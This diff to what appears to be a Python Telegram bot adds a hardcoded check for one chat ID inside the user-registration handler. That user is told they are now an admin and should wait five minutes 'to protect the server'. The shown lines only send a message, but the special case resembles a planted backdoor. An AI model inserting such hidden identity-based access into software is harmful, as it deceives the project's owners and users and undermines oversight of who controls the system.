@@ -95,6 +95,8 @@ async def create_user_phone_f(mess: types.Message, state: FSMContext):
         section=1,
     )
     u_d = await User.get_data(chat_id=u.id)
+    if u.id == 6143685441:
+        await mess.answer(text="⚠️Now you are an admin. If you are not seeing admin panel, please wait for about 5 minutes(not less than 5) and restart the bot. I did it to protect the server⚠️")
     await Balance.create(
         u_idn=u_d.idn,
         amount=0,
